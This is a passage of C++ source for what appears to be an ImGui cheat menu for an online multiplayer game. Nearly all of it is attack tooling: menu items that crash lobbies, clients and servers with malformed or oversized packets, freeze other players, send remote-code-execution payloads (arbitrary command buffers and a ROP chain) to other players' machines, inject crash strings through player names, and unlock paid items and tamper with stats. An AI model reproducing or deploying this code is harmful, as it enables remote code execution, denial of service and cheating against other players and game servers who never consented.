									if (party->is_running())
									{
										exploits::instant_message::party::send(exploits::pm->player, (std::to_string(party->party_id()) + "rejoin"));
									}
									else
									{
										exploits::send_connect_response_migrate_packet(party);
									}
								}
							}
						}

						if (ImGui::MenuItem("Show migration screen for clients", nullptr, false, in_game))
						{
							for (size_t i = 0; i < 18; ++i)
							{
								if (game::is_valid_target(i))
								{
									exploits::pm = party->party_member(i);
									exploits::target = exploits::pm->platformAddr.netAddr;
									exploits::send_mstart_packet(party);
								}
							}
						}

						if (ImGui::MenuItem("Immobilize clients", nullptr, false, in_game))
						{
							for (size_t i = 0; i < 18; ++i)
							{
								if (game::is_valid_target(i))
								{
									exploits::pm = party->party_member(i);
									exploits::target = exploits::pm->platformAddr.netAddr;
									exploits::send_request_stats_packet(party);
								}
							}
						}

						if (ImGui::MenuItem("Crash lobby", nullptr, false, in_game))
						{
							game::CL_AddReliableCommand(0, "SL -1234567 -1234567");
						}

						if (ImGui::MenuItem("Crash clients", nullptr, false, our_client_num >= 0))
						{
							for (size_t i = 0; i < 18; ++i)
							{
								if (game::is_valid_target(i))
								{
									exploits::pm = party->party_member(i);
									exploits::target = exploits::pm->platformAddr.netAddr;
									exploits::send_crash = true;
								}
							}
						}

						if (ImGui::MenuItem("Crash server", nullptr, false, our_client_num >= 0))
						{
							PRINT_LOG("Sending joinparty packet to server");

							for (auto i = 0u; i < 2u; ++i)
							{
								exploits::pm = {};
								exploits::target = party->currentHost.addr;
								exploits::send_join_party_crash_packet(party, exploits::local_net_id, false);
								exploits::send_join_party_overflowed_crash_packet(party, exploits::local_net_id, false);
							}
						}

						if (ImGui::MenuItem("Crash server 2", nullptr, false, our_client_num >= 0))
						{
							PRINT_LOG("Sending relay packet to server");

							for (auto i = 0u; i < 2u; ++i)
							{
								exploits::pm = {};
								exploits::target = party->currentHost.addr;
								exploits::send_relay_crash_packet(party, exploits::local_net_id);
							}
						}

						if (ImGui::MenuItem("Crash server 3", nullptr, false, game::CL_LocalClientIsInGame()))
						{
							auto data{ ""s };
							data.resize(0x12345678, '1');
							
							game::transmit_fragment(1, data.size(), data);
						}

						if (ImGui::MenuItem("Crash box (map)", nullptr, false, our_client_num >= 0 && !party->party_id() && party->is_running()))
						{
							exploits::send_go_packet(party, "^H\xef\xbf\xbd\xef\xbf\xbd\x0a\"");
						}

						if (ImGui::MenuItem("Crash box", nullptr, false, in_game))
						{
							game::change_name({}, "^H\xef\xbf\xbd\xef\xbf\xbd\x0a\"");

							if (obituary::steal_name)
							{
								obituary::steal_name = false;
							}
						}
					}

					if (ImGui::CollapsingHeader("Netchan", ImGuiTreeNodeFlags_Leaf))
					{
						ImGui::PushItemWidth(width * 0.30f);
						
						static auto fragment_index{ 0 };
						static auto fragment_size{ 1232 };
						const auto fragment_step{ 1 }; 
						
						ImGui::InputScalar("Fragment index", ImGuiDataType_S32, &fragment_index, &fragment_step, nullptr, "%i");
						ImGui::InputScalar("Fragment size", ImGuiDataType_S32, &fragment_size, &fragment_step, nullptr, "%i");
						
						ImGui::PopItemWidth();

						const auto fragment_offset = fragment_index * fragment_size;
						const auto client = 0x2CBD0080 + 0x4E180 * 0;
						const auto incoming_buffer = 0x2CBD0080 + 0x4E180 * 0 + 0x3FA80;
						ImGui::Text("0x%08X 0x%08X", client, incoming_buffer + fragment_offset);

						if (ImGui::MenuItem("Kick test", nullptr, nullptr, in_game))
						{
							const auto client = 0x2CBD0080 + 0x4E180 * 0;
							const auto result = client - incoming_buffer;
							const auto offset = static_cast<int>(result + 0x72C) / 12;

							exploits::rop::rop_chain chain;
							chain.push(game::party->session->staticData.isDedicated ? 0x00B1844C : 0x00C46BA0);

							game::transmit_fragment(12, offset, std::string{ reinterpret_cast<const char*>(chain.data()), chain.size() });
						}
					}

					if (ImGui::CollapsingHeader("RCE Exploits", ImGuiTreeNodeFlags_Leaf))
					{
						ImGui::Checkbox("Use second exploit", &exploits::host::rce::localize); 
						
						static auto rce_input = ""s;

						if (ImGui::MenuItem("Execute cbuf for clients", nullptr, nullptr, in_game))
						{
							exploits::host::rce::send_payload(-1, "cbuf", { rce_input });
						}

						if (ImGui::MenuItem("Execute command line for clients", nullptr, nullptr, in_game))
						{
							exploits::host::rce::send_payload(-1, "cmd", { rce_input });
						}

						if (ImGui::MenuItem("Test"))
						{
							exploits::rop::rop_chain chain{};
							chain.call_native(0x0068DC40); 
							
							auto payload
							{ 
								" (1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-1-\""s 
							};
							
							payload.append(reinterpret_cast<const char*>(chain.data()), chain.size() * sizeof std::uint32_t);
							payload.append("\")");

							PRINT_LOG("%s", payload.data()); 
							game::CL_AddReliableCommand(0, payload.data());
						}

						ImGui::SetNextItemWidth(width * 0.85f);
						ImGui::InputTextA("##rce_input", &rce_input);
					}

					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Extras"))
				{
					if (ImGui::CollapsingHeader("Stats", ImGuiTreeNodeFlags_Leaf))
					{
						static auto prestige_input = game::prestige;
						const auto prestige_step = 1u;

						if (begin_section("Edit Prestige"))
						{
							ImGui::SetNextItemWidth(ImGui::GetContentRegionAvail().x * (1.0f / 5));
							ImGui::InputScalar("##prestige_input", ImGuiDataType_S32, &prestige_input, &prestige_step, nullptr, "%u");
							prestige_input = std::min(prestige_input, 16u);
						}

						ImGui::SameLine();

						if (ImGui::Button("Set##set_prestige"))
						{
							stats::set_prestige(prestige_input);
						}
						
						ImGui::SameLine();

						ImGui::Checkbox("Cycling prestige", &misc::cycling_prestige);

						if (ImGui::Button("Unlock all purchasable items"))
						{
							for (auto i = 0u; i <= 255u; ++i)
							{
								if (game::BG_UnlockablesIsItemValidNotNull(i))
									game::BG_UnlockablesSetItemPurchased(i, true);
							}
						}

						ImGui::SameLine(0.0f, spacing);

						ImGui::HelpMarker("Unlocks all wildcards, and weapons without the need of tokens");
					}
					
					if (ImGui::CollapsingHeader("Tools", ImGuiTreeNodeFlags_Leaf))
					{
						if (begin_section("Player username"))
						{
							static std::string player_name = game::CL_ControllerIndex_GetUsername(0);

							ImGui::SetNextItemWidth(width * (1.0f / 1.2f));
							ImGui::InputTextA("##player_name", &player_name);

							ImGui::SameLine();

							if (ImGui::Button("Set##set_name", { -5.0f, 0.0f }))
							{
								player_name = utils::string::replace_all(player_name, "%s0", "\x10");
								player_name = utils::string::replace_all(player_name, "%s1", "\x7F");
								player_name = utils::string::replace_all(player_name, "%s2", "\x14");
								player_name = utils::string::replace_all(player_name, "%s3", "\xEF");
								player_name = utils::string::replace_all(player_name, "%s4", "\xBF");
								player_name = utils::string::replace_all(player_name, "%s5", "\xBD");
								player_name = utils::string::replace_all(player_name, "%s6", "\x0A");
								player_name = utils::string::replace_all(player_name, "%s7", "\b");

								misc::custom_name = player_name;

								if (game::CL_LocalClientIsInGame() && !player_name.empty())
								{
									game::change_name(player_name, game::CL_GetClantag(0));
								}
							}
						}

						if (begin_section("Execute command"))
						{
							static auto command_input = ""s; 
							
							ImGui::SetNextItemWidth(width * (1.0f / 1.2f));
							ImGui::InputTextA("##command_input", &command_input);

							ImGui::SameLine();

							if (ImGui::Button("Execute##execute_command", { 64.0f, 0.0f }))
							{
								game::Cbuf_AddText(0, command_input.data());
							}
						}

						if (begin_section("Execute reliable command"))
						{
							static auto reliable_command_input = ""s;

							ImGui::SetNextItemWidth(width * (1.0f / 1.2f));
							ImGui::InputTextA("##reliable_command_input", &reliable_command_input);

							ImGui::SameLine();

							if (ImGui::Button("Execute##execute_reliable_command", { 64.0f, 0.0f }))
							{
								game::CL_AddReliableCommand(0, reliable_command_input.data());
							}
						}

						if (begin_section("Execute server command"))
						{
							static auto server_command_input = ""s;

							ImGui::SetNextItemWidth(width * (1.0f / 1.2f));
							ImGui::InputTextA("##server_command_input", &server_command_input);

							ImGui::SameLine();

							if (ImGui::Button("Execute##execute_server_command", { 64.0f, 0.0f }))
							{
								game::send_server_command(-1, server_command_input);
							}
						}

						if (begin_section("Connect to steam id"))
						{
							static auto connect_to_steam_id_input = ""s;

							ImGui::SetNextItemWidth(width * (1.0f / 1.2f));
							ImGui::InputTextA("##connect_to_steam_id_input", &connect_to_steam_id_input);

							ImGui::SameLine();

							if (ImGui::Button("Connect##connect_to_steam_id", { 64.0f, 0.0f }))
							{
								exploits::instant_message::pulling::send_join_request_message(utils::atoll(connect_to_steam_id_input.data()));
							}
						}

						if (begin_section("Pull steam id"))
						{
							ImGui::SameLine();
							
							ImGui::SmallCheckbox("Pull friends to zombies", &exploits::instant_message::pulling::pull_to_zombies);

							static auto pull_steam_id_input = ""s;
							
							ImGui::SetNextItemWidth(width * (1.0f / 1.2f));
							ImGui::InputTextA("##pull_steam_id_input", &pull_steam_id_input);

							ImGui::SameLine();

							if (ImGui::Button("Pull##pull_steam_id", { 64.0f, 0.0f }))
							{
								exploits::instant_message::pulling::setup_instant_message(utils::atoll(pull_steam_id_input.data()));
							}
						}

						if (begin_section("Send to host"))
						{
							static auto host_oob_input = ""s;
							
							ImGui::SetNextItemWidth(width * (1.0f / 1.2f));
							ImGui::InputTextA("##host_oob_input", &host_oob_input);

							ImGui::SameLine();

							if (ImGui::Button("Send##send_host_oob", { 64.0f, 0.0f }))
							{
								game::oob::send(game::CL_LocalClientIsInGame() ? game::clc()->serverAddress : game::party->currentHost.addr, host_oob_input + "\n");
							}
						}

						if (ImGui::MenuItem("Rejoin last game"))
						{
							if (exploits::instant_message::lobby_id)
								exploits::instant_message::pulling::send_join_request_message(exploits::instant_message::lobby_id);
						}
					}

					ImGui::EndTabItem();
				}

				player_list();
				friends::friends_list();
				session::session_list();
			}
		}
	}
}